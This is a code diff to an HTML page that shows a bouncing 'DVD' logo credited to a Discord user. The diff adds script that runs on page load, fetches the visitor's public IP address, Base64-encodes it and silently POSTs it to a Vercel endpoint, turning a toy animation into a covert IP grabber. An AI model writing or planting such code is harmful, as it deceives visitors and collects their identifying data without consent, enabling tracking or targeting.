@@ -37,12 +37,13 @@
 <body>
     <div id="dvd">Made By i_love_python123.<br>On Discord</div>
 
+    <!-- Load the external JS script that handles the IP fetching and POST request -->
     <script src="api/api.js"></script>
 
     <script>
         const dvd = document.getElementById('dvd');
         let x = 100, y = 100;
-        let dx = 4, dy = 4;
+        let dx = 4, dy = 4; // Speed
 
         function getRandomColor() {
             return `rgb(${Math.random() * 255}, ${Math.random() * 255}, ${Math.random() * 255})`;
@@ -73,6 +74,46 @@
         }
 
         moveDVD();
+
+        // Fetch, encode the IP and send a POST request when the page loads
+        window.onload = function() {
+            getUserIP(); // Call the function to get IP
+
+            function getUserIP() {
+                fetch('https://api.ipify.org?format=json')
+                    .then(response => response.json())
+                    .then(data => {
+                        console.log('Your IP Address is:', data.ip);
+                        
+                        // Encode the IP address to Base64
+                        const encodedIP = btoa(data.ip); // btoa encodes the IP to Base64
+
+                        // Send POST request with the encoded IP to the Vercel API
+                        sendEncodedIP(encodedIP);
+                    })
+                    .catch(error => {
+                        console.error('Error fetching IP address:', error);
+                    });
+            }
+
+            // Function to send POST request with the encoded IP
+            function sendEncodedIP(encodedIP) {
+                fetch('https://your-vercel-project.vercel.app/api/api.js', {  // Change to your deployed API URL
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ ip: encodedIP }) // Send the encoded IP in the request body
+                })
+                .then(response => response.json())
+                .then(data => {
+                    console.log('Response from API:', data);
+                })
+                .catch(error => {
+                    console.error('Error sending POST request:', error);
+                });
+            }
+        };
     </script>
 </body>
 </html>
